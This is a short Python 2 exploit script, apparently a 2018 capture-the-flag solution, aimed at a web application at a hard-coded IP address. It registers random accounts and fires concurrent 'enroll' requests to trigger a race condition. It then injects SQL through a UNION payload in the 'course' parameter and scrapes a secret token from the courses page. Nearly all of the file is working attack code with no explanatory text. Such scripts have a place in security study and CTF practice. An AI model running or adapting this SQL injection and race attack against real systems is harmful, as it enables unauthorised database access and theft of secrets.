#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.
import requests
import json
from multiprocessing import Pool
import random
from pwn import *


name="".join(map(chr,[random.randint(0,25)+ord('a') for _ in range(0x1f)]))

def run():
    s=requests.Session()
    data={"username":name,"password":"12345"}
    p=s.get("http://178.128.26.72//login.php?",params=data)
    print name
    params={
        "action":"enroll",
        "course":"a"*0x40,
    }
    print s.get("http://178.128.26.72/login.php",params=params).text
    print s.get("http://178.128.26.72/login.php",params=params).text

def race():
    pool=Pool()
    pool.apply_async(run)
    pool.apply_async(run)
    pool.close()
    pool.join()

def exe_mysql(sql):
    s=requests.Session()
    name="".join(map(chr,[random.randint(0,25)+ord('a') for _ in range(0x1f)]))
    print name
    data={"username":name,"password":"12345"}
    print s.get("http://178.128.26.72/login.php?",params=data).text
    payload="'UNION %s#"%sql
    print payload
    print len(payload)
    assert len(payload)<=0x40
    params={"action":"enroll","course":payload}
    print s.get("http://178.128.26.72/login.php",params=params).text
    params["course"]="Lob"
    print s.get("http://178.128.26.72/login.php",params=params).text
    params["course"]="Net"
    print s.get("http://178.128.26.72/login.php",params=params).text
    data=s.get("http://178.128.26.72/courses.php").text
    idx=data.find("Token: ")+len("Token: ")
    token=data[idx:idx+0x40]
    print token
    return token


